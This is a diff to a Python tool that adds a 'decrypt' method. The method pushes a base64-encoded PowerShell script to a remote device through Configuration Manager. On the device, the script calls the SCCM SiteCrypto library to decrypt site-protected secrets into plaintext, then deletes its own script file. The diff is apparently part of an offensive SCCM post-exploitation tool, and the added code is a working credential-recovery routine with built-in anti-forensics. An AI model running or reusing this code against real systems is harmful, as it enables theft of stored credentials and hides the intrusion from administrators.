@@ -202,6 +202,55 @@ Do-Delete
         script_body = base64.b64encode(byte_array).decode('utf-8')
         self.device = device
         self.add_script(script_body)
+
+    def decrypt(self, blob, device):
+        script = '''
+    Add-Type -Path "C:\\Program Files\\Microsoft Configuration Manager\\bin\\X64\\Microsoft.ConfigurationManager.ManagedBase.dll"
+
+    function Invoke-Decrypt {
+        [CmdletBinding()]
+        param (
+            [Parameter(Mandatory = $true, Position = 0)]
+            [string]$Hex,
+            
+            [Parameter(Mandatory = $false)]
+            [switch]$UseSiteSystemKey = $false
+        )
+        try {
+            $encryptedData = $Hex
+            $decryptedData = New-Object System.Security.SecureString
+            $traceInfo = ""
+
+            $result = [Microsoft.ConfigurationManager.ManagedBase.SiteCrypto]::Decrypt(
+                $UseSiteSystemKey,
+                $encryptedData,
+                [ref]$decryptedData,
+                [ref]$traceInfo
+            )
+
+            if ($result) {
+                # Convert SecureString to plain text
+                return [Microsoft.ConfigurationManager.ManagedBase.SiteCrypto]::ToUnsecureString($decryptedData)
+            } else {
+                throw "Decryption failed. Trace info: $traceInfo"
+            }
+        } catch {
+            Write-Error $_
+            $PSCmdlet.ThrowTerminatingError($_)
+        }
+    }
+
+    Invoke-Decrypt -Hex %r
+    function Do-Delete {
+        Del $MyInvocation.PSCommandPath
+    }
+    Do-Delete
+    ''' %blob
+        bom = codecs.BOM_UTF16_LE
+        byte_array = bom + script.encode('utf-16-le')
+        script_body = base64.b64encode(byte_array).decode('utf-8')
+        self.device = device
+        self.add_script(script_body)
         
 
     def printlog(self, result):
